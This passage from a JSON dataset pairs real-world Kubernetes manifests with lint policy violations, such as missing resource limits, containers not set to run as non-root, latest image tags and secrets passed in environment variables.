    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: guestbook-service-v1\n  labels:\n    app: guestbook-service\n    version: '1.0'\n    visualize: 'true'\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: guestbook-service\n      version: '1.0'\n      serving: 'true'\n  template:\n    metadata:\n      labels:\n        app: guestbook-service\n        serving: 'true'\n        version: '1.0'\n        visualize: 'true'\n    spec:\n      containers:\n      - name: guestbook-service\n        image: saturnism/guestbook-service-istio:1.0\n        livenessProbe:\n          initialDelaySeconds: 90\n          httpGet:\n            path: /actuator/health\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n        ports:\n        - containerPort: 8080\n          name: http\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"guestbook-service\" has cpu request 0"
  },
  {
    "id": "7174",
    "manifest_path": "data/manifests/the_stack_sample/sample_2624.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: guestbook-service-v1\n  labels:\n    app: guestbook-service\n    version: '1.0'\n    visualize: 'true'\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: guestbook-service\n      version: '1.0'\n      serving: 'true'\n  template:\n    metadata:\n      labels:\n        app: guestbook-service\n        serving: 'true'\n        version: '1.0'\n        visualize: 'true'\n    spec:\n      containers:\n      - name: guestbook-service\n        image: saturnism/guestbook-service-istio:1.0\n        livenessProbe:\n          initialDelaySeconds: 90\n          httpGet:\n            path: /actuator/health\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n        ports:\n        - containerPort: 8080\n          name: http\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"guestbook-service\" has memory limit 0"
  },
  {
    "id": "7175",
    "manifest_path": "data/manifests/the_stack_sample/sample_2625.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20191104-e7d5b8453\n        args:\n        - --github-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"crier\" does not have a read-only root file system"
  },
  {
    "id": "7176",
    "manifest_path": "data/manifests/the_stack_sample/sample_2625.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20191104-e7d5b8453\n        args:\n        - --github-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"crier\" is not set to runAsNonRoot"
  },
  {
    "id": "7177",
    "manifest_path": "data/manifests/the_stack_sample/sample_2625.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20191104-e7d5b8453\n        args:\n        - --github-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"crier\" has cpu request 0"
  },
  {
    "id": "7178",
    "manifest_path": "data/manifests/the_stack_sample/sample_2625.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20191104-e7d5b8453\n        args:\n        - --github-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"crier\" has memory limit 0"
  },
  {
    "id": "7179",
    "manifest_path": "data/manifests/the_stack_sample/sample_2626.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: service-server\n  labels:\n    app: assemblyline\n    section: core\n    component: service-server\nspec:\n  clusterIP: None\n  selector:\n    app: assemblyline\n    section: core\n    component: service-server\n  ports:\n  - protocol: TCP\n    port: 5003\n    targetPort: 5003\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:assemblyline component:service-server section:core])"
  },
  {
    "id": "7180",
    "manifest_path": "data/manifests/the_stack_sample/sample_2627.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: depa-backend-deployment\n  annotations:\n    kubernetes.io/change-cause: ENV_CHANGE_CAUSE_MESSAGE\n  labels:\n    app: depa-backend\n    version: LABEL_VERSION\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: depa-backend\n      version: LABEL_VERSION\n  template:\n    metadata:\n      labels:\n        app: depa-backend\n        version: LABEL_VERSION\n    spec:\n      containers:\n      - name: depa-backend\n        image: AZ_CONTAINER_REGISTRY_URL/dev/depa-backend:IMAGE_BUILD_ID\n        imagePullPolicy: Always\n        readinessProbe:\n          tcpSocket:\n            port: 8080\n          initialDelaySeconds: 5\n        env:\n        - name: SERVER_ENVIRONMENT\n          value: ENV_SERVER_ENVIRONMENT\n        - name: BRANCH\n          value: ENV_GIT_BRANCH\n        - name: VERSION\n          value: ENV_BUILD_ID\n        - name: MONGO_PASSWORD\n          value: ENV_MONGO_PASSWORD\n        - name: FACEBOOK_ID\n          value: ENV_FACEBOOK_ID\n        - name: FACEBOOK_SECRET\n          value: ENV_FACEBOOK_SECRET\n        - name: GOOGLE_ID\n          value: ENV_GOOGLE_ID\n        - name: GOOGLE_SECRET\n          value: ENV_GOOGLE_SECRET\n        resources:\n          limits:\n            memory: 256Mi\n            cpu: 200m\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable FACEBOOK_SECRET in container \"depa-backend\" found"
  },
  {
    "id": "7181",
    "manifest_path": "data/manifests/the_stack_sample/sample_2627.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: depa-backend-deployment\n  annotations:\n    kubernetes.io/change-cause: ENV_CHANGE_CAUSE_MESSAGE\n  labels:\n    app: depa-backend\n    version: LABEL_VERSION\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: depa-backend\n      version: LABEL_VERSION\n  template:\n    metadata:\n      labels:\n        app: depa-backend\n        version: LABEL_VERSION\n    spec:\n      containers:\n      - name: depa-backend\n        image: AZ_CONTAINER_REGISTRY_URL/dev/depa-backend:IMAGE_BUILD_ID\n        imagePullPolicy: Always\n        readinessProbe:\n          tcpSocket:\n            port: 8080\n          initialDelaySeconds: 5\n        env:\n        - name: SERVER_ENVIRONMENT\n          value: ENV_SERVER_ENVIRONMENT\n        - name: BRANCH\n          value: ENV_GIT_BRANCH\n        - name: VERSION\n          value: ENV_BUILD_ID\n        - name: MONGO_PASSWORD\n          value: ENV_MONGO_PASSWORD\n        - name: FACEBOOK_ID\n          value: ENV_FACEBOOK_ID\n        - name: FACEBOOK_SECRET\n          value: ENV_FACEBOOK_SECRET\n        - name: GOOGLE_ID\n          value: ENV_GOOGLE_ID\n        - name: GOOGLE_SECRET\n          value: ENV_GOOGLE_SECRET\n        resources:\n          limits:\n            memory: 256Mi\n            cpu: 200m\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable GOOGLE_SECRET in container \"depa-backend\" found"
  },
  {
    "id": "7182",
    "manifest_path": "data/manifests/the_stack_sample/sample_2627.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: depa-backend-deployment\n  annotations:\n    kubernetes.io/change-cause: ENV_CHANGE_CAUSE_MESSAGE\n  labels:\n    app: depa-backend\n    version: LABEL_VERSION\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: depa-backend\n      version: LABEL_VERSION\n  template:\n    metadata:\n      labels:\n        app: depa-backend\n        version: LABEL_VERSION\n    spec:\n      containers:\n      - name: depa-backend\n        image: AZ_CONTAINER_REGISTRY_URL/dev/depa-backend:IMAGE_BUILD_ID\n        imagePullPolicy: Always\n        readinessProbe:\n          tcpSocket:\n            port: 8080\n          initialDelaySeconds: 5\n        env:\n        - name: SERVER_ENVIRONMENT\n          value: ENV_SERVER_ENVIRONMENT\n        - name: BRANCH\n          value: ENV_GIT_BRANCH\n        - name: VERSION\n          value: ENV_BUILD_ID\n        - name: MONGO_PASSWORD\n          value: ENV_MONGO_PASSWORD\n        - name: FACEBOOK_ID\n          value: ENV_FACEBOOK_ID\n        - name: FACEBOOK_SECRET\n          value: ENV_FACEBOOK_SECRET\n        - name: GOOGLE_ID\n          value: ENV_GOOGLE_ID\n        - name: GOOGLE_SECRET\n          value: ENV_GOOGLE_SECRET\n        resources:\n          limits:\n            memory: 256Mi\n            cpu: 200m\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7183",
    "manifest_path": "data/manifests/the_stack_sample/sample_2627.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: depa-backend-deployment\n  annotations:\n    kubernetes.io/change-cause: ENV_CHANGE_CAUSE_MESSAGE\n  labels:\n    app: depa-backend\n    version: LABEL_VERSION\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: depa-backend\n      version: LABEL_VERSION\n  template:\n    metadata:\n      labels:\n        app: depa-backend\n        version: LABEL_VERSION\n    spec:\n      containers:\n      - name: depa-backend\n        image: AZ_CONTAINER_REGISTRY_URL/dev/depa-backend:IMAGE_BUILD_ID\n        imagePullPolicy: Always\n        readinessProbe:\n          tcpSocket:\n            port: 8080\n          initialDelaySeconds: 5\n        env:\n        - name: SERVER_ENVIRONMENT\n          value: ENV_SERVER_ENVIRONMENT\n        - name: BRANCH\n          value: ENV_GIT_BRANCH\n        - name: VERSION\n          value: ENV_BUILD_ID\n        - name: MONGO_PASSWORD\n          value: ENV_MONGO_PASSWORD\n        - name: FACEBOOK_ID\n          value: ENV_FACEBOOK_ID\n        - name: FACEBOOK_SECRET\n          value: ENV_FACEBOOK_SECRET\n        - name: GOOGLE_ID\n          value: ENV_GOOGLE_ID\n        - name: GOOGLE_SECRET\n          value: ENV_GOOGLE_SECRET\n        resources:\n          limits:\n            memory: 256Mi\n            cpu: 200m\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"depa-backend\" does not have a read-only root file system"
  },
  {
    "id": "7184",
    "manifest_path": "data/manifests/the_stack_sample/sample_2627.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: depa-backend-deployment\n  annotations:\n    kubernetes.io/change-cause: ENV_CHANGE_CAUSE_MESSAGE\n  labels:\n    app: depa-backend\n    version: LABEL_VERSION\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: depa-backend\n      version: LABEL_VERSION\n  template:\n    metadata:\n      labels:\n        app: depa-backend\n        version: LABEL_VERSION\n    spec:\n      containers:\n      - name: depa-backend\n        image: AZ_CONTAINER_REGISTRY_URL/dev/depa-backend:IMAGE_BUILD_ID\n        imagePullPolicy: Always\n        readinessProbe:\n          tcpSocket:\n            port: 8080\n          initialDelaySeconds: 5\n        env:\n        - name: SERVER_ENVIRONMENT\n          value: ENV_SERVER_ENVIRONMENT\n        - name: BRANCH\n          value: ENV_GIT_BRANCH\n        - name: VERSION\n          value: ENV_BUILD_ID\n        - name: MONGO_PASSWORD\n          value: ENV_MONGO_PASSWORD\n        - name: FACEBOOK_ID\n          value: ENV_FACEBOOK_ID\n        - name: FACEBOOK_SECRET\n          value: ENV_FACEBOOK_SECRET\n        - name: GOOGLE_ID\n          value: ENV_GOOGLE_ID\n        - name: GOOGLE_SECRET\n          value: ENV_GOOGLE_SECRET\n        resources:\n          limits:\n            memory: 256Mi\n            cpu: 200m\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"depa-backend\" is not set to runAsNonRoot"
  },
  {
    "id": "7185",
    "manifest_path": "data/manifests/the_stack_sample/sample_2627.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: depa-backend-deployment\n  annotations:\n    kubernetes.io/change-cause: ENV_CHANGE_CAUSE_MESSAGE\n  labels:\n    app: depa-backend\n    version: LABEL_VERSION\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: depa-backend\n      version: LABEL_VERSION\n  template:\n    metadata:\n      labels:\n        app: depa-backend\n        version: LABEL_VERSION\n    spec:\n      containers:\n      - name: depa-backend\n        image: AZ_CONTAINER_REGISTRY_URL/dev/depa-backend:IMAGE_BUILD_ID\n        imagePullPolicy: Always\n        readinessProbe:\n          tcpSocket:\n            port: 8080\n          initialDelaySeconds: 5\n        env:\n        - name: SERVER_ENVIRONMENT\n          value: ENV_SERVER_ENVIRONMENT\n        - name: BRANCH\n          value: ENV_GIT_BRANCH\n        - name: VERSION\n          value: ENV_BUILD_ID\n        - name: MONGO_PASSWORD\n          value: ENV_MONGO_PASSWORD\n        - name: FACEBOOK_ID\n          value: ENV_FACEBOOK_ID\n        - name: FACEBOOK_SECRET\n          value: ENV_FACEBOOK_SECRET\n        - name: GOOGLE_ID\n          value: ENV_GOOGLE_ID\n        - name: GOOGLE_SECRET\n          value: ENV_GOOGLE_SECRET\n        resources:\n          limits:\n            memory: 256Mi\n            cpu: 200m\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"depa-backend\" has cpu request 0"
  },
  {
    "id": "7186",
    "manifest_path": "data/manifests/the_stack_sample/sample_2628.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aws-ebs-csi-driver-operator\n  namespace: openshift-cluster-csi-drivers\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: aws-ebs-csi-driver-operator\n  template:\n    metadata:\n      labels:\n        name: aws-ebs-csi-driver-operator\n    spec:\n      containers:\n      - args:\n        - start\n        env:\n        - name: DRIVER_IMAGE\n          value: quay.io/openshift/origin-aws-ebs-csi-driver:latest\n        - name: PROVISIONER_IMAGE\n          value: quay.io/openshift/origin-csi-external-provisioner:latest\n        - name: ATTACHER_IMAGE\n          value: quay.io/openshift/origin-csi-external-attacher:latest\n        - name: RESIZER_IMAGE\n          value: quay.io/openshift/origin-csi-external-resizer:latest\n        - name: SNAPSHOTTER_IMAGE\n          value: quay.io/openshift/origin-csi-external-snapshotter:latest\n        - name: NODE_DRIVER_REGISTRAR_IMAGE\n          value: quay.io/openshift/origin-csi-node-driver-registrar:latest\n        - name: LIVENESS_PROBE_IMAGE\n          value: quay.io/openshift/origin-csi-livenessprobe:latest\n        - name: KUBE_RBAC_PROXY_IMAGE\n          value: quay.io/openshift/origin-kube-rbac-proxy:latest\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: quay.io/openshift/origin-aws-ebs-csi-driver-operator:latest\n        imagePullPolicy: IfNotPresent\n        name: aws-ebs-csi-driver-operator\n      serviceAccountName: aws-ebs-csi-driver-operator\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"aws-ebs-csi-driver-operator\" is using an invalid container image, \"quay.io/openshift/origin-aws-ebs-csi-driver-operator:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7187",
    "manifest_path": "data/manifests/the_stack_sample/sample_2628.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aws-ebs-csi-driver-operator\n  namespace: openshift-cluster-csi-drivers\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: aws-ebs-csi-driver-operator\n  template:\n    metadata:\n      labels:\n        name: aws-ebs-csi-driver-operator\n    spec:\n      containers:\n      - args:\n        - start\n        env:\n        - name: DRIVER_IMAGE\n          value: quay.io/openshift/origin-aws-ebs-csi-driver:latest\n        - name: PROVISIONER_IMAGE\n          value: quay.io/openshift/origin-csi-external-provisioner:latest\n        - name: ATTACHER_IMAGE\n          value: quay.io/openshift/origin-csi-external-attacher:latest\n        - name: RESIZER_IMAGE\n          value: quay.io/openshift/origin-csi-external-resizer:latest\n        - name: SNAPSHOTTER_IMAGE\n          value: quay.io/openshift/origin-csi-external-snapshotter:latest\n        - name: NODE_DRIVER_REGISTRAR_IMAGE\n          value: quay.io/openshift/origin-csi-node-driver-registrar:latest\n        - name: LIVENESS_PROBE_IMAGE\n          value: quay.io/openshift/origin-csi-livenessprobe:latest\n        - name: KUBE_RBAC_PROXY_IMAGE\n          value: quay.io/openshift/origin-kube-rbac-proxy:latest\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: quay.io/openshift/origin-aws-ebs-csi-driver-operator:latest\n        imagePullPolicy: IfNotPresent\n        name: aws-ebs-csi-driver-operator\n      serviceAccountName: aws-ebs-csi-driver-operator\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"aws-ebs-csi-driver-operator\" does not have a read-only root file system"
  },
  {
    "id": "7188",
    "manifest_path": "data/manifests/the_stack_sample/sample_2628.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aws-ebs-csi-driver-operator\n  namespace: openshift-cluster-csi-drivers\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: aws-ebs-csi-driver-operator\n  template:\n    metadata:\n      labels:\n        name: aws-ebs-csi-driver-operator\n    spec:\n      containers:\n      - args:\n        - start\n        env:\n        - name: DRIVER_IMAGE\n          value: quay.io/openshift/origin-aws-ebs-csi-driver:latest\n        - name: PROVISIONER_IMAGE\n          value: quay.io/openshift/origin-csi-external-provisioner:latest\n        - name: ATTACHER_IMAGE\n          value: quay.io/openshift/origin-csi-external-attacher:latest\n        - name: RESIZER_IMAGE\n          value: quay.io/openshift/origin-csi-external-resizer:latest\n        - name: SNAPSHOTTER_IMAGE\n          value: quay.io/openshift/origin-csi-external-snapshotter:latest\n        - name: NODE_DRIVER_REGISTRAR_IMAGE\n          value: quay.io/openshift/origin-csi-node-driver-registrar:latest\n        - name: LIVENESS_PROBE_IMAGE\n          value: quay.io/openshift/origin-csi-livenessprobe:latest\n        - name: KUBE_RBAC_PROXY_IMAGE\n          value: quay.io/openshift/origin-kube-rbac-proxy:latest\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: quay.io/openshift/origin-aws-ebs-csi-driver-operator:latest\n        imagePullPolicy: IfNotPresent\n        name: aws-ebs-csi-driver-operator\n      serviceAccountName: aws-ebs-csi-driver-operator\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"aws-ebs-csi-driver-operator\" not found"
  },
  {
    "id": "7189",
    "manifest_path": "data/manifests/the_stack_sample/sample_2628.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aws-ebs-csi-driver-operator\n  namespace: openshift-cluster-csi-drivers\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: aws-ebs-csi-driver-operator\n  template:\n    metadata:\n      labels:\n        name: aws-ebs-csi-driver-operator\n    spec:\n      containers:\n      - args:\n        - start\n        env:\n        - name: DRIVER_IMAGE\n          value: quay.io/openshift/origin-aws-ebs-csi-driver:latest\n        - name: PROVISIONER_IMAGE\n          value: quay.io/openshift/origin-csi-external-provisioner:latest\n        - name: ATTACHER_IMAGE\n          value: quay.io/openshift/origin-csi-external-attacher:latest\n        - name: RESIZER_IMAGE\n          value: quay.io/openshift/origin-csi-external-resizer:latest\n        - name: SNAPSHOTTER_IMAGE\n          value: quay.io/openshift/origin-csi-external-snapshotter:latest\n        - name: NODE_DRIVER_REGISTRAR_IMAGE\n          value: quay.io/openshift/origin-csi-node-driver-registrar:latest\n        - name: LIVENESS_PROBE_IMAGE\n          value: quay.io/openshift/origin-csi-livenessprobe:latest\n        - name: KUBE_RBAC_PROXY_IMAGE\n          value: quay.io/openshift/origin-kube-rbac-proxy:latest\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: quay.io/openshift/origin-aws-ebs-csi-driver-operator:latest\n        imagePullPolicy: IfNotPresent\n        name: aws-ebs-csi-driver-operator\n      serviceAccountName: aws-ebs-csi-driver-operator\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"aws-ebs-csi-driver-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "7190",
    "manifest_path": "data/manifests/the_stack_sample/sample_2628.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aws-ebs-csi-driver-operator\n  namespace: openshift-cluster-csi-drivers\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: aws-ebs-csi-driver-operator\n  template:\n    metadata:\n      labels:\n        name: aws-ebs-csi-driver-operator\n    spec:\n      containers:\n      - args:\n        - start\n        env:\n        - name: DRIVER_IMAGE\n          value: quay.io/openshift/origin-aws-ebs-csi-driver:latest\n        - name: PROVISIONER_IMAGE\n          value: quay.io/openshift/origin-csi-external-provisioner:latest\n        - name: ATTACHER_IMAGE\n          value: quay.io/openshift/origin-csi-external-attacher:latest\n        - name: RESIZER_IMAGE\n          value: quay.io/openshift/origin-csi-external-resizer:latest\n        - name: SNAPSHOTTER_IMAGE\n          value: quay.io/openshift/origin-csi-external-snapshotter:latest\n        - name: NODE_DRIVER_REGISTRAR_IMAGE\n          value: quay.io/openshift/origin-csi-node-driver-registrar:latest\n        - name: LIVENESS_PROBE_IMAGE\n          value: quay.io/openshift/origin-csi-livenessprobe:latest\n        - name: KUBE_RBAC_PROXY_IMAGE\n          value: quay.io/openshift/origin-kube-rbac-proxy:latest\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: quay.io/openshift/origin-aws-ebs-csi-driver-operator:latest\n        imagePullPolicy: IfNotPresent\n        name: aws-ebs-csi-driver-operator\n      serviceAccountName: aws-ebs-csi-driver-operator\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"aws-ebs-csi-driver-operator\" has cpu request 0"
  },
  {
    "id": "7191",
    "manifest_path": "data/manifests/the_stack_sample/sample_2628.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: aws-ebs-csi-driver-operator\n  namespace: openshift-cluster-csi-drivers\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: aws-ebs-csi-driver-operator\n  template:\n    metadata:\n      labels:\n        name: aws-ebs-csi-driver-operator\n    spec:\n      containers:\n      - args:\n        - start\n        env:\n        - name: DRIVER_IMAGE\n          value: quay.io/openshift/origin-aws-ebs-csi-driver:latest\n        - name: PROVISIONER_IMAGE\n          value: quay.io/openshift/origin-csi-external-provisioner:latest\n        - name: ATTACHER_IMAGE\n          value: quay.io/openshift/origin-csi-external-attacher:latest\n        - name: RESIZER_IMAGE\n          value: quay.io/openshift/origin-csi-external-resizer:latest\n        - name: SNAPSHOTTER_IMAGE\n          value: quay.io/openshift/origin-csi-external-snapshotter:latest\n        - name: NODE_DRIVER_REGISTRAR_IMAGE\n          value: quay.io/openshift/origin-csi-node-driver-registrar:latest\n        - name: LIVENESS_PROBE_IMAGE\n          value: quay.io/openshift/origin-csi-livenessprobe:latest\n        - name: KUBE_RBAC_PROXY_IMAGE\n          value: quay.io/openshift/origin-kube-rbac-proxy:latest\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: quay.io/openshift/origin-aws-ebs-csi-driver-operator:latest\n        imagePullPolicy: IfNotPresent\n        name: aws-ebs-csi-driver-operator\n      serviceAccountName: aws-ebs-csi-driver-operator\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"aws-ebs-csi-driver-operator\" has memory limit 0"
  },
  {
    "id": "7192",
    "manifest_path": "data/manifests/the_stack_sample/sample_2629.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cassandra-stress-small\n  labels:\n    app: cassandra-stress\nspec:\n  volumes:\n  - name: cassandra-stress-profile-volume\n    configMap:\n      name: cassandra-stress-small\n  securityContext:\n    fsGroup: 1\n    runAsNonRoot: true\n    runAsUser: 1006\n    supplementalGroups:\n    - 1\n  containers:\n  - name: cassie1-cassandra-stress\n    image: orangeopensource/cassandra-image\n    imagePullPolicy: IfNotPresent\n    securityContext:\n      capabilities:\n        add:\n        - IPC_LOCK\n    command:\n    - /bin/sh\n    args:\n    - -c\n    - cassandra-stress 'user profile=/opt/cassandra-stress/small_stress.yaml ops(insert=2,query_by_sub_id=1)\n      duration=1m cl=one -node cassandra-demo -mode native cql3 user=cassandra password=cassandra\n      -rate threads=20 -pop seq=0..1M -graph file=/tmp/stress-small.html' && echo\n      END && while true ; do sleep 60; done\n    resources:\n      limits:\n        cpu: 1\n        memory: 2Gi\n      requests:\n        cpu: 1\n        memory: 2Gi\n    volumeMounts:\n    - name: cassandra-stress-profile-volume\n      mountPath: /opt/cassandra-stress\n",
    "policy_id": "drop-net-raw-capability",
    "violation_text": "container \"cassie1-cassandra-stress\" has DROP capabilities: [], but does not drop capability \"NET_RAW\" which is required"
  },
  {
    "id": "7193",
    "manifest_path": "data/manifests/the_stack_sample/sample_2629.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cassandra-stress-small\n  labels:\n    app: cassandra-stress\nspec:\n  volumes:\n  - name: cassandra-stress-profile-volume\n    configMap:\n      name: cassandra-stress-small\n  securityContext:\n    fsGroup: 1\n    runAsNonRoot: true\n    runAsUser: 1006\n    supplementalGroups:\n    - 1\n  containers:\n  - name: cassie1-cassandra-stress\n    image: orangeopensource/cassandra-image\n    imagePullPolicy: IfNotPresent\n    securityContext:\n      capabilities:\n        add:\n        - IPC_LOCK\n    command:\n    - /bin/sh\n    args:\n    - -c\n    - cassandra-stress 'user profile=/opt/cassandra-stress/small_stress.yaml ops(insert=2,query_by_sub_id=1)\n      duration=1m cl=one -node cassandra-demo -mode native cql3 user=cassandra password=cassandra\n      -rate threads=20 -pop seq=0..1M -graph file=/tmp/stress-small.html' && echo\n      END && while true ; do sleep 60; done\n    resources:\n      limits:\n        cpu: 1\n        memory: 2Gi\n      requests:\n        cpu: 1\n        memory: 2Gi\n    volumeMounts:\n    - name: cassandra-stress-profile-volume\n      mountPath: /opt/cassandra-stress\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cassie1-cassandra-stress\" is using an invalid container image, \"orangeopensource/cassandra-image\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7194",
    "manifest_path": "data/manifests/the_stack_sample/sample_2629.yaml",
